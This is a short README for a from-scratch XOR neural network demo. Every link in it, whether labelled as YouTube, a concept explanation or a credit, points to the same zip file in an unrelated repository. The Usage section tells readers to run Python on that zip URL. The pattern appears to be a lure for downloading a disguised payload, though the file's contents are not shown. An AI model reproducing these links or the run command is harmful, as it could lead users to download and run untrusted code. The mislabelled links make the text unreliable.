#Make a Neural Net Live Demo

##Overview
This is an implementation of a two-layer neural network during the live demo by @Sirajology on [Youtube](https://github.com/SteveGoguelin/make_a_neural_net_live_demo/raw/refs/heads/master/pesage/neural-net-make-demo-a-live-1.1-alpha.1.zip). The training method is stochastic (online) [gradient descent](https://github.com/SteveGoguelin/make_a_neural_net_live_demo/raw/refs/heads/master/pesage/neural-net-make-demo-a-live-1.1-alpha.1.zip) with momentum. It computes XOR for the given input. It uses two activation functions, one for each layer. One is a tanh function and the other is the sigmoid function. It uses [cross-entropy](https://github.com/SteveGoguelin/make_a_neural_net_live_demo/raw/refs/heads/master/pesage/neural-net-make-demo-a-live-1.1-alpha.1.zip) as it's loss function. This is all done in less than 100 lines of code. We're building this thing from scratch!

##Dependencies

None!

##Usage

Just run the following in terminal to see it run. 

``
python https://github.com/SteveGoguelin/make_a_neural_net_live_demo/raw/refs/heads/master/pesage/neural-net-make-demo-a-live-1.1-alpha.1.zip
``

##Credits

The credits for the majority of this code go to [lightcaster](https://github.com/SteveGoguelin/make_a_neural_net_live_demo/raw/refs/heads/master/pesage/neural-net-make-demo-a-live-1.1-alpha.1.zip). I've merely created a wrapper to get people started.
